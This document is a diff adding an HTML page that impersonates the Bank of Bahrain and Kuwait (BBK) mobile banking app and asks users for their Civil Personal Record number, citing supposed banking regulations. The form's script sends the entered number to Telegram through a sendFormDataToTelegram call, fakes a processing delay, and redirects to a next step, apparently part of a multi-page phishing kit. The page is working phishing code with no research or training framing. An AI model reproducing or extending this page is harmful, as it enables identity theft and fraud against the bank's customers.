@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBK Mobile Banking - CPR Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            flex: 1;
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 60px;
+            margin-top: 20px;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .logo-star {
+            position: absolute;
+            right: -15px;
+            top: -5px;
+            font-size: 20px;
+            color: white;
+        }
+
+        .logo-arabic {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            direction: rtl;
+        }
+
+        .cpr-text {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .cpr-text h1 {
+            font-size: 24px;
+            font-weight: 300;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .cpr-text p {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+            padding: 15px 0;
+            font-size: 16px;
+            color: white;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 300;
+        }
+
+        .input-field:focus {
+            border-bottom-color: white;
+        }
+
+        .submit-button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 25px;
+            padding: 18px;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: 400;
+        }
+
+        .submit-button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .back-button {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .back-button a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-button a:hover {
+            opacity: 1;
+            text-decoration: underline;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .info-note {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.4;
+        }
+
+        /* Mobile Responsive Styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .logo-container {
+                margin-bottom: 40px;
+                margin-top: 10px;
+            }
+            
+            .logo-text {
+                font-size: 24px;
+            }
+            
+            .cpr-text {
+                margin-bottom: 40px;
+            }
+            
+            .cpr-text h1 {
+                font-size: 22px;
+                margin-bottom: 16px;
+            }
+            
+            .cpr-text p {
+                font-size: 14px;
+            }
+            
+            .input-field {
+                font-size: 16px; /* Prevent zoom on iOS */
+                padding: 12px 0;
+            }
+            
+            .submit-button {
+                padding: 16px;
+                font-size: 16px;
+                min-height: 48px; /* Touch-friendly */
+            }
+            
+            .info-note {
+                padding: 12px;
+                font-size: 13px;
+                margin-bottom: 24px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+            }
+            
+            .logo-container {
+                margin-bottom: 30px;
+            }
+            
+            .logo-text {
+                font-size: 22px;
+            }
+            
+            .logo-star {
+                font-size: 18px;
+                right: -12px;
+            }
+            
+            .cpr-text {
+                margin-bottom: 30px;
+            }
+            
+            .cpr-text h1 {
+                font-size: 20px;
+            }
+            
+            .cpr-text p {
+                font-size: 13px;
+            }
+            
+            .input-group {
+                margin-bottom: 30px;
+            }
+            
+            .submit-button {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .container {
+                padding: 20px 12px;
+            }
+            
+            .cpr-text h1 {
+                font-size: 18px;
+            }
+        }
+        
+        /* Prevent zoom on input focus (iOS) */
+        @media screen and (max-width: 768px) {
+            input, select, textarea {
+                font-size: 16px !important;
+            }
+        }
+        
+        /* Touch-friendly interactions */
+        @media (hover: none) and (pointer: coarse) {
+            .submit-button, .back-button a {
+                -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
+                touch-action: manipulation;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo">
+                <div class="logo-text">
+                    BBK
+                    <span class="logo-star">✱</span>
+                </div>
+                <div class="logo-arabic">بنك البحرين والكويت</div>
+            </div>
+        </div>
+
+        <div class="cpr-text">
+            <h1>CPR Verification</h1>
+            <p>Please provide your Civil Personal Record (CPR) number for identity verification</p>
+        </div>
+
+        <div class="info-note">
+            <strong>Note:</strong> Your CPR number is required for enhanced security verification as per Bahrain banking regulations.
+        </div>
+        <form id="cprForm">
+        <div class="form-container">
+
+            <div class="input-group">
+                <input type="tel" class="input-field" name="cpr" placeholder="CPR Number *" id="cprNumber" maxlength="9" required>
+            </div>
+
+            <button type="submit" class="submit-button" id="submitBtn">Continue</button>
+        </form>
+            <div class="back-button">
+                <a href="index.html">← Back</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="telegram.js"></script>
+    <script>
+        document.getElementById('cprForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cpr = document.getElementById('cprNumber').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (!cpr) {
+                alert('Please enter your CPR number');
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
+            
+            try {
+                // Send CPR to Telegram
+                await sendFormDataToTelegram('New CPR Details', {
+                    'CPR': cpr
+                });
+                
+                // Simulate processing time
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Redirect to next page
+                window.location.href = 'number.html?msg=again';
+            } catch (error) {
+                console.error('Error submitting CPR:', error);
+                alert('Failed to process. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Continue';
+            }
+        });
+    </script>
+</body>
+</html>
